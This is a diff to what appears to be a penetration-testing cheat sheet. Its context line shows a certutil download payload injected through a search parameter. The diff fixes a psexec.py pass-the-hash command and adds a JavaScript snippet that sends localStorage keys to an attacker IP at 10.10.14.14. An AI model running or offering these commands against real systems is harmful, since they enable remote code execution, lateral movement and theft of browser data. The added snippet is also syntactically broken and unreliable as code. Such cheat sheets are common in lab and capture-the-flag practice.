@@ -176,7 +176,18 @@ http://172.31.1.24/?search=%00{.exec|certutil.exe%20-urlcache%20-f%20http://10.1
 
 [psexec]
 psexec.py -hashes LM:NTLM administrator@10.200.200.127
-psexec.pt domain/username:password@10.10.10.10
+psexec.py domain/username:password@10.10.10.10
+
+[XHR Requests]
+```
+var r = new XMLHttpRequest();
+
+s = localStorage()
+for (i in s){
+	r =open("GET","http://10.10.14.14/?"+i,true);
+	r.send();
+}
+```
 
 [LM empty string]
 aad3b435b51404eeaad3b435b51404ee
